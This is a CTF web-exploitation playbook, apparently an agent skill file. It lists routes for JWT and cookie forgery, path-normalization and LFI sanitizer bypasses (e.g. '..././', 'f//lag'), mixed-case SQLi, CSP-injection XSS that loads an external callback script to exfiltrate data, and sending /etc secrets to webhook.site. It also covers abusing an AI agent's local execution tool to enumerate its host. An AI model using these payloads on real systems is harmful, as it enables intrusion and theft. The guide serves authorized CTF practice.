# CTF Web

## First Pass

- Use `scripts/ctf_web.py init-case` and `snapshot` before manual HTTP probing.
- Capture page text, source, scripts, cookies, storage, requests, redirects, and
  response headers through reusable tools where possible.
- Identify server-side state: session cookie, JWT, CSRF token, role flag,
  hidden route, API endpoint, or cache key.
- Compare unauthenticated, provided-account, and modified-request behavior.
- Keep raw requests and responses before changing payloads.
- Read bundled JavaScript, source maps, and route metadata before fuzzing; many
  CTF apps hide real API fields, admin routes, test credentials, or feature
  flags in front-end bundles.

## Common Routes

### Cookie And Session

- Signal: title or hint names cookie, login always fails, anonymous credentials
  are provided, or role seems cookie-derived.
- First probes: inspect `Set-Cookie`, cookie attributes, local/session storage,
  JWT shape, base64-looking values, signed cookie framework markers. Use
  `ctf_web.py cookie-decode` for unverified payload inspection.
- Common route: decode first, then test whether role, username, path, protocol,
  or host trust is encoded client-side. If signed, look for weak secret, known
  framework, algorithm confusion, or server-side alternate login path.
- False leads: brute-forcing secrets without evidence, modifying every cookie
  at once, ignoring redirects and domain/path scoping.

### Secure Cookie On HTTP

- Signal: login response says success and sets a session cookie, but the
  browser still appears unauthenticated on an HTTP-only challenge site.
- First probes: inspect `Set-Cookie` for `Secure`, compare browser behavior with
  a manual `Cookie:` header, and check reverse proxy config if exposed.
- Common route: if the server marks the cookie `Secure` while only HTTP is
  available, the browser will not send it. Use a controlled request to confirm
  the authenticated endpoint with the issued cookie, or fix exposed CTF config
  when the challenge explicitly offers that route.
- False leads: assuming the credential is wrong after a success response,
  brute-forcing passwords, or ignoring cookie attributes.
- Evidence to keep: login response, `Set-Cookie`, target protocol, authenticated
  endpoint response, and any exposed proxy config.
- Example cases: [NO.1 Cookie](ctf-case-no1-cookie.md).

### Auth And Access Control

- Compare direct object routes, API routes, referer/origin checks, method
  changes, path normalization, and trailing slash variants.
- Check whether the app trusts `X-Forwarded-*`, `Host`, `X-Original-URL`,
  `X-Rewrite-URL`, or protocol headers.
- For JWT/JWE/OAuth/SAML flows, inspect header parameters, key selection,
  redirect binding, `state`, audience/issuer validation, replay, and whether
  identity is bound to the current session.

### Agent Chat Endpoint With Local Tool Bridge

- Signal: landing text hints at an "agent", "claw", "assistant",
  "intelligent scenario", MCP/A2A, or tool interface, while ordinary metadata
  routes are sparse. A discovered `/chat`, `/session`, `/sse`, or messages
  endpoint streams tool calls or exposes command-like tool names.
- First probes: snapshot the landing page, check health/session/chat endpoints,
  create a fresh session when supported, then send one short benign command
  request and capture the full SSE stream. Keep requests serialized when the
  service allows only one active session.
- Common route: once the agent exposes a local execution tool, pivot from web
  route guessing to local CTF evidence gathering: `pwd`, `id`, app directory,
  environment, SUID files, internal service variables, and small binary
  exfiltration through base64 when reverse analysis is needed.
- False leads: repeatedly probing MCP/A2A paths after a simpler chat endpoint
  is found, sending broad long-running "find flag" requests that lock the
  session, or trusting the model's final prose instead of the raw
  `tool_result`.
- Useful tools: `ctf_web.py snapshot`, `param-probe`, `request`,
  `agent-ws-chat` for PoW-gated WebSocket agents, `agent-ws-protocol-probe`
  for schema/frame/concurrency edge cases, `curl -N` for SSE capture, local
  `file/readelf/objdump/strings` after base64 extraction.
- When a PoW WebSocket emits a session id, `agent-ws-chat` query text supports
  `{SESSION_ID}`, `{POW_PREFIX}`, `{POW_TARGET}`, and `{POW_NONCE}`
  placeholders so follow-up chat can test session-derived authorization without
  manual copy/paste races.
- Evidence to keep: landing hint, `/chat` and `/session` responses, first tool
  call proof, environment and SUID inventory, extracted binary hash or copy,
  exploit command, and final `tool_result` containing the flag.
- Example cases: [Bytedance Lobster Hole](ctf-case-bytedance-lobster-hole.md).

### Request-Body Principal Override After Authentication

- Signal: source code passes a trusted JWT/session principal into a service
  method, then later merges request JSON into the same object shape using
  patterns such as `{ ...trusted, ...body }`, `{ user, ...query }`, or
  `Object.assign(trusted, body)`.
- First probes: obtain any valid low-privilege token, decode it to understand
  trusted claim shape, then compare the protected route with and without a body
  field named like the principal (`user`, `account`, `auth`, `claims`, or
  `role`).
- Common route: use a real signed token only to pass middleware. Put a forged
  principal or role in the request body where later business logic reads it.
  If the list endpoint leaks object ids or slugs, pivot to the read endpoint
  and preserve both the leak response and object response.
- False leads: spending time forging the JWT secret when the signature layer is
  correct, assuming `role: null` prevents all useful access, or reading random
  objects before using server-side search/filter parameters to narrow results.
- Useful tools: `ctf_artifact.py zip-inspect`, `ctf_web.py request`,
  `jwt-decode`, and `param-probe`.
- Evidence to keep: source lines showing the merge order, valid token response,
  decoded low-privilege token, protected-route failure without token,
  protected-route success with body override, leaked ids/slugs, and final object
  read.
- Example cases: [BytePaste](ctf-case-bytepaste.md).

### Client-Side Disabled Actions With Server Validation Tokens

- Signal: a profile, message, invite, purchase, or admin action renders the
  target object id and form route, but disables the submit button in HTML or
  JavaScript. A helper script adds a hidden token such as `validation`, `csrf`,
  or `nonce` only when the button is enabled.
- First probes: learn the normal flow with controlled accounts; capture the
  working form, hidden fields, script-generated fields, token endpoint, and
  success redirect. Then compare the target object's disabled form and test
  whether the same server route accepts a direct POST.
- Common route: the disabled button suppresses browser submission and token
  injection, but the backend does not re-check the same authorization boundary.
  Fetch the latest server-side token, submit the action directly with the
  target object id and hidden fields, then read the resulting notification,
  message, or state change.
- Instance rule: when a challenge is respawned under a new host, rerun the
  final fresh-token action and flag-bearing read on the new host. Treat
  validation values and final flags as per-instance evidence.
- False leads: assuming disabled UI is authorization, reusing stale one-time
  tokens, testing only the browser click path, or skipping the controlled-user
  baseline that reveals the exact request shape.
- Useful tools: `ctf_web.py request`, `login-probe`, `auth-confirm`,
  `cookie-decode`, and `ctf_browser.sh snapshot` when JavaScript injects fields.
- Evidence to keep: working controlled-user form, target disabled form,
  JavaScript token injection snippet, fresh token response, stale-token failure,
  successful direct POST, and final state or message response.
- Example cases: [NO.14 Private Messenger](ctf-case-no14-private-messenger.md).

### Encrypted Mobile API Envelopes With Cross-Object Approval Checks

- Signal: the public site mostly serves an APK or mobile bundle, decompiled
  code exposes API routes plus AES or custom request wrapping, and backend
  workflows use separate object ids for create, join, approval, and detail
  operations.
- First probes: capture the landing artifact, run `ctf_mobile.py apk-summary`,
  `jadx-decompile`, and `source-grep`, then recover the base URL, envelope
  format, key derivation, and auth header rules. Promote the envelope replay
  into a repeatable web skill command before continuing. After that, create a
  normal account and compare list, detail, join, and approval responses.
- Common route: the mobile app only obscures transport. Once the envelope is
  replayable, enumerate normal objects and pending-request states. If approval
  takes both an admin-owned object id and a request id, test whether the server
  validates admin rights on one object but mutates state based only on the
  request id. A controlled object you own can become the approval primitive for
  a different target object.
- False leads: treating client-side encryption as a true server-side defense,
  brute-forcing auth secrets before trying a normal account, assuming a
  distance or visibility gate is the final authorization check, or testing only
  the target object before creating a controlled admin-owned object.
- Useful tools: `ctf_mobile.py apk-summary`, `jadx-decompile`, `source-grep`,
  `ctf_web.py aes-envelope-request`, and `jwt-decode` when bearer tokens are
  involved.
- Evidence to keep: APK summary, decompiled crypto/API sources, replayable
  encrypted request and response logs, distance or visibility probes, pending
  request ids, controlled-object creation response, mismatched approval
  response, and final detail/list output that proves the state change.
- Example cases: [Interest Circle](ctf-case-interest-circle.md).

### Exposed Source Maps And Development APIs

- Signal: a public React/Vue/admin template still serves `*.js.map`, source
  comments mention test accounts or TODO APIs, or production has routes such as
  `/api/user/list`, `/api/user/reset`, `/api/user/register`, or debug user
  management endpoints.
- First probes: download the main bundle and source map, run
  `ctf_web.py source-map-extract`, inspect restored route/login/auth files,
  then test only explicitly named low-risk APIs with a normal provided or
  discovered test session.
- Common route: source maps restore original source, exposing test credentials
  and development endpoints. A reachable user list or reset endpoint may leak
  administrator credentials or allow a controlled privilege transition.
- False leads: trusting disabled mock credentials, assuming front-end
  `localStorage` role switching is enough for server-side admin checks, or
  fuzzing API names before reading restored source.
- Instance rule: when a platform respawns the same challenge under a new target
  host, rerun the final privileged endpoint instead of reusing a previously
  recorded flag.
- Evidence to keep: bundle and source map responses, sourcemap extraction
  summary, source file path containing the credential/API clue, leaked API
  response, admin login response, and final privileged endpoint response.
- Example cases:
  [NO.11 Admin Dev Public](ctf-case-no11-admin-dev-public.md).

### JWT Signature Encoding Blacklist Bypass

- Signal: a valid privileged JWT is leaked but rejected as blacklisted, while
  the application checks the raw token string before verifying/decoding it.
- First probes: decode the leaked token; compare exact blacklisted response,
  padding variants, header/payload mutations, and signature-only base64url
  variants. Use `ctf_web.py jwt-variant-probe`.
- Common route: for HS256 signatures, the final unpadded base64url character
  can contain unused low bits. Changing only those unused bits keeps the decoded
  signature bytes unchanged, so HMAC verification still succeeds, but the token
  string differs from the blacklist entry.
- False leads: cracking the JWT secret before checking equivalent encodings,
  mutating header or payload without resigning, or assuming adding padding will
  bypass a blacklist that normalizes tokens.
- Evidence to keep: leaked privileged token source, exact blacklisted response,
  generated equivalent tokens, accepted privileged response, and the byte-level
  equivalence note.
- Example cases: [NO.6 BitDancing Guest](ctf-case-no6-bitdancing-guest.md).

### Empty JWT Secret With Claim-Driven Object Reads

- Signal: attached source reads the JWT HMAC key from an environment variable,
  deployment config does not set that variable, and protected routes use JWT
  claims such as `ID`, `email`, `tenant`, or `role` to choose database objects.
- First probes: obtain a normal token, decode it to confirm algorithm and
  claim shape, verify the empty string or obvious configured secret before
  trying wordlists, and inspect which claim each protected route actually
  consumes. If a metadata endpoint exposes user ids or counts, use it only to
  bound the CTF candidate set.
- Common route: sign HS256 tokens with the confirmed empty or weak secret and
  vary only the claim consumed by the target endpoint. For export/download
  routes, `ID` may matter more than `Email` or profile flags.
- False leads: brute-forcing secrets before checking configuration, assuming
  `IsPrivate` or role claims control every read, or changing several claims at
  once and losing the route's real trust boundary.
- Useful tools: `ctf_web.py jwt-decode`, `jwt-crack`, `jwt-sign`, and
  `param-probe`.
- Evidence to keep: source lines for secret loading and claim use, deployment
  config, decoded baseline token, empty-secret verification, forged token
  payload, bounded candidate list, and final flag-bearing response.
- Example cases: [Byte Secret](ctf-case-byte-secret.md).

### Raw Path Prefix Auth Bypass

- Signal: source or behavior shows an auth allowlist implemented with
  `path.startswith`, `strings.HasPrefix`, route group prefix checks, or
  middleware skip rules for public paths.
- First probes: compare direct protected route, public route, literal
  dot-segment route, percent-encoded dot segments, percent-encoded slashes,
  double encoding, repeated slashes, and trailing slash variants. Preserve the
  exact URL that the client sends.
- Common route: if middleware checks the raw request URI but the framework
  router decodes or normalizes before route matching, keep the raw path under a
  public prefix while resolving the normalized path to a protected route, such
  as `/public/%2e%2e/admin/flag`.
- False leads: brute-forcing tokens before checking route normalization,
  assuming a placeholder token in leaked source is deployed unchanged, or using
  an HTTP client that normalizes `/../` before transmission.
- Evidence to keep: blocked direct route, public route behavior, middleware
  source or inferred rule, route map, encoded bypass request, and protected
  response.
- Example cases: [NO.4 Easy Hertz](ctf-case-no4-easy-hertz.md).

### Stateful Business Logic

- Signal: shop, member level, balance, points, gift, ranking, or repeated task
  flows.
- First probes: capture product and price state, user balance, reward
  endpoints, and each state transition response.
- Common route: use `ctf_web.py repeat-request` when one low-risk endpoint must
  be repeated while carrying updated cookies forward.
- False leads: repeating requests without saving updated cookies, assuming
  client-side button limits are server-side limits, or ignoring negative and
  decimal numeric parameters.

### Credential Governance Console

- Signal: a CTF business console exposes database rows containing cookies,
  session ids, API tokens, or other reusable credentials, plus allowed actions
  such as delete, hash, encrypt, validate, or reset.
- First probes: snapshot the page, read JavaScript for API routes, query the
  inventory table, and run the built-in help command before mutating state.
- Common route: classify each row by business need. Delete credentials with no
  necessary scenario. For equality or correlation lookup, replace plaintext
  with a one-way approved hash such as SHA-256. Then run the validation routine
  and request the flag.
- False leads: using MD5 because it is a hash, using reversible encryption,
  deleting rows that the business still needs for lookup, or losing the session
  cookie between state-changing requests.
- Evidence to keep: inventory before and after, help output naming accepted and
  rejected actions, mutation responses, final validation response, browser
  screenshots of each page, and final flag response.
- Example cases:
  [Local Demo Plaintext Credential Governance](ctf-case-local-demo-plaintext-credential.md).

### Payment Numeric Parameter Abuse

- Signal: points, coins, wallet, total spending, recharge, gift, or purchase
  APIs expose `num`, `amount`, `count`, `price`, `id`, or product parameters.
- First probes: compare self-purchase and gift flows; try boundary values such
  as `0`, `-1`, large negative values, decimals, and oversized counts in a
  controlled CTF account.
- Common route: if negative purchase returns coins but total spending is clamped
  at zero, first set total spending to zero, then purchase a large negative
  quantity to inflate coins, then make normal positive purchases to cross the
  gift or membership threshold.
- False leads: slow level grinding when a numeric parameter changes state
  directly, assuming balance and cumulative spend are updated atomically, or
  missing lower-bound clamping.
- Evidence to keep: pre-state, vulnerable request, post-state showing refunded
  coins and clamped spending, final positive purchase, and flag response.
- Example cases: [NO.2 Member Gift](ctf-case-no2-member-gift.md).

### HTTP Session Replay And Client-Side Media Gates

- Signal: a pcap, proxy log, or browser trace contains session cookies; the
  challenge mentions member-only video, hidden content, HTTP traffic, or
  playback that stops early.
- First probes: reconstruct HTTP streams; enumerate `Cookie` and session IDs;
  compare user/role API responses; compare the media metadata endpoint under
  each candidate session; read bundled JavaScript for player setup and
  `start_time` / `end_time` style gates.
- Common route: replay the leaked privileged session in the browser context,
  not only in raw HTTP. Encrypted or licensed video often needs the original
  page player and license flow. Use browser frame capture when the flag appears
  visually or only for a short time.
- Alternative route: if the backend sends the complete media but JavaScript
  destroys the player after a time gate, mock the gate response in a controlled
  CTF browser/proxy context and capture the rendered result.
- False leads: copying an encrypted MP4 URL directly; assuming the numerically
  highest role is the real target role; trusting a funny or longer Easter video
  before checking media identity; sampling only one tail frame.
- Evidence to keep: parsed pcap HTTP summary, candidate session table, API
  response diffs, player JavaScript snippet, injected-browser capture summary,
  and contact sheet or frame sequence used to reconstruct the flag.
- Example cases: [NO.3 Achilles Video](ctf-case-no3-http-video.md).

### Injection

- SQL/NoSQL/LDAP/XPath: identify reflection, error differences, boolean/time
  behavior, and parameter type.
- Command injection: look for shell metacharacter handling, line breaks, and
  restricted wrappers.
- SSTI: test harmless arithmetic or template markers before payloads.
- GraphQL: check introspection, batching, aliases, IDOR through object IDs, and
  string interpolation in resolver-backed queries.

### SQLite SQLi With Simple Keyword Blacklists

- Signal: a search parameter reflects SQLite errors or route hints, and common
  lowercase SQL words are blocked by a naive string filter.
- First probes: test quote closure, comment styles, mixed-case keywords,
  `/**/` whitespace replacement, boolean probes, and `sqlite_master` schema
  enumeration. Preserve the original query shape if `sqlite_stmt` is available.
- Common route: mixed-case keywords such as `UnIoN`, `SeLeCt`, `FrOm` plus
  inline comments bypass case-sensitive filters. Dump `sqlite_master`, then
  targeted tables. Check SQLite virtual tables such as `pragma_table_list`,
  `pragma_function_list`, `sqlite_stmt`, and `sqlite_dbpage` when available.
- False leads: assuming a blocked lowercase `union select` means SQLi is
  impossible, jumping to destructive stacked statements, or ignoring table rows
  that contain later-route hints.
- Evidence to keep: quote error, working boolean probe, schema dump, table
  dumps, and any route or credential hints extracted from SQL.
- Example cases: [NO.6 BitDancing Guest](ctf-case-no6-bitdancing-guest.md).

### File And Parser Bugs

- File upload: extension, MIME, magic bytes, path, image parser, archive
  extraction, and public URL mapping.
- File read/include: path traversal, wrappers, encoding, null byte only for old
  stacks, and log poisoning only in CTF scope.
- Deserialization: framework markers, magic methods, signed blobs, pickle,
  PHP serialized data, Java serialization, YAML/XML loaders.
- Parser mismatch: compare proxy/app URL parsing, `path.startswith` checks,
  Unicode normalization, double encoding, archive symlinks, and image/PDF/XML
  converters.

### Directory Listing And Signed Download URLs

- Signal: a page fetches `/sign?filename=...` or a similar API that returns a
  signed `/download` URL, while static resources are served from a predictable
  directory.
- First probes: request the linked static directory with `ctf_web.py request`;
  check for directory listing, `.DS_Store`, manifests, source maps, private
  media playlists, and filenames that contradict the public page.
- Common route: use `ctf_web.py signed-download-probe` with filenames from the
  listing. Download only files that are explicitly listed or clearly in scope,
  then pass images, archives, media, or source files to the matching artifact
  tool.
- False leads: guessing many filenames before checking the directory index,
  treating a signing endpoint as access control, or trusting the extension
  without inspecting magic bytes and embedded data.
- Evidence to keep: directory listing response, signed URL probe JSON, each
  downloaded file hash, and downstream artifact summaries.
- Example cases:
  [NO.13 Image Hosting Abuse Evidence](ctf-case-no13-image-hosting-abuse.md).

### Single-Pass LFI Sanitizer Bypass

- Signal: a file viewer echoes a sanitized path, prefixes a public directory,
  appends an extension, and replaces suspicious substrings such as `flag`, `//`,
  or `../`.
- First probes: map the sanitizer by requesting harmless known files with
  literal traversal, double slashes, split sensitive words, URL encoding, and
  nested dot patterns. Use `ctf_web.py lfi-probe` once a target file shape is
  known.
- Common route: if the sanitizer removes `../` only once, a payload such as
  `..././` can produce a fresh `../` after replacement. If literal `flag` is
  replaced before slash collapse, split it as `f//lag`.
- False leads: only trying `../` and URL encoding, assuming `public/../x` is
  blocked because `public/x` is not found, or missing private subdirectories
  when direct `flag2.txt` fails.
- Evidence to keep: sanitizer map, echoed path before/after bypass, successful
  read of a harmless file such as `requirements.txt`, final private file read,
  and the exact payload.
- Example cases: [NO.6 BitDancing Guest](ctf-case-no6-bitdancing-guest.md).

### SSRF And Internal Fetch

- Signal: URL fetcher, webhook, PDF/image renderer, import-by-URL, avatar URL,
  XML external entity, proxy feature, or cloud metadata hint.
- First probes: allowed schemes, redirects, DNS rebinding behavior, IPv6/IPv4
  normalization, parser discrepancies, blocked host bypasses, and response
  reflection.
- Evidence to keep: requested URL, server-side fetch result, DNS/HTTP logs when
  available, and the internal endpoint reached.

### PostgreSQL SECURITY DEFINER Helper With Loopback-Only Rebinding Proxy

- Signal: a PostgreSQL challenge or service exposes only a low-privilege role,
  image or PGDATA artifacts hint at md5 verifiers or deleted scripts, and a
  `SECURITY DEFINER` function shells out to a helper while comments mention a
  loopback-only proxy socket such as `/mnt/run/rebind-proxy.sock`.
- First probes: recover deleted image layers before deep SQL coercion, reuse
  md5 verifiers with a PTH-capable PostgreSQL client, audit
  `pg_get_functiondef(...)`, and prove the blind helper path with a harmless
  POST marker to an external receiver through a fresh DNS rebinding domain.
- Common route: use layer forensics to recover both login material and any
  later decryptor, pivot from low-privilege SQL into the `SECURITY DEFINER`
  helper, validate rebinding with a marker, then exfiltrate the raw `/etc/`
  secret instead of assuming the file has a fixed prefix or single-line shape.
- False leads: over-investing in large-object state machines after the helper
  socket clue is confirmed, assuming the sample writeup's exact file format
  matches the local instance, or treating blind shell execution as useless just
  because SQL swallows stdout/stderr.
- Useful tools: `ctf_pg.py query`, `ctf_artifact.py tar-inspect`, `curl`,
  `socat`, and a public request catcher such as `webhook.site`.
- Evidence to keep: recovered deleted-layer files, md5 verifier proof, helper
  function definition, marker callback, raw exfiltrated file body, and final
  decryptor output.
- Example cases: [PII In PG PI Player](ctf-case-pii-in-pg-pi-player.md).

### Browser-Side

- XSS usually needs a sink, a delivery route, and an admin/bot behavior.
- Prototype pollution needs an object merge path and a reachable privileged
  sink.
- CORS issues need credentialed requests and a sensitive readable response.
- CSP/XS-Leak/CSS exfil routes need a measurable side channel. Record timing,
  cache, font, frame, postMessage, or navigation evidence before chaining.

### CSP Source Injection For Blind XSS

- Signal: a blind admin page has a restrictive `script-src` CSP, but a
  submitted URL, website, webhook, or domain field later appears in the CSP
  source list.
- First probes: confirm HTML rendering with a harmless image callback, then
  submit a URL containing a delimiter such as `;/` and re-check the CSP header
  on the protected or unauthorized route.
- Common route: add the callback host to `script-src` through the URL field,
  submit an external `<script src=https://<callback-host>/x.js>`, and serve a
  minimal exfil script with `ctf_oob.py serve --response-file`.
- False leads: treating blocked event handlers as proof that XSS is impossible,
  placing the callback URL only in the URL field, or forgetting that an
  ephemeral tunnel domain must match both CSP and script `src`.
- Evidence to keep: baseline CSP, injected CSP, image callback proof, external
  script request, callback POST body, and final flag-bearing text.
- Example cases: [NO.5 Blind Ads Cross](ctf-case-no5-blind-ads-cross.md).

### Blind Callback Flows

- Signal: a submitted URL, webhook, lead, report, feedback field, HTML snippet,
  or stored content is reviewed by a worker, crawler, or admin bot, and direct
  responses do not show the effect.
- First probes: submit a harmless marker, confirm timing and stored reflection,
  then run `ctf_oob.py serve` to capture out-of-band HTTP requests. Use a
  public tunnel only inside the authorized CTF scope.
- Common route: make the blind worker request a callback URL with a unique
  marker; once confirmed, move the payload to the smallest exfiltration needed
  for the challenge, such as page title, path reached, cookie presence, or a
  flag-bearing response.
- False leads: assuming no bug because the submit response is unchanged,
  running many payloads without unique markers, or losing callback logs before
  preserving them under the case directory.
- Evidence to keep: submit request, callback JSONL log, public tunnel URL,
  unique marker, and final exfiltrated value.

## Useful Tools

`scripts/ctf_web.py`, especially `snapshot`, `request`, and `js-analyze` for
front-end API discovery; `scripts/ctf_browser.sh` for browser-rendered pages,
screenshots, storage, cookies, console output, and network summaries;
`scripts/ctf_oob.py` for blind callback logging; curl/httpie; Burp/ZAP;
ffuf/gobuster; sqlmap when explicitly appropriate; jwt-cli or small Python
decoders; CyberChef.
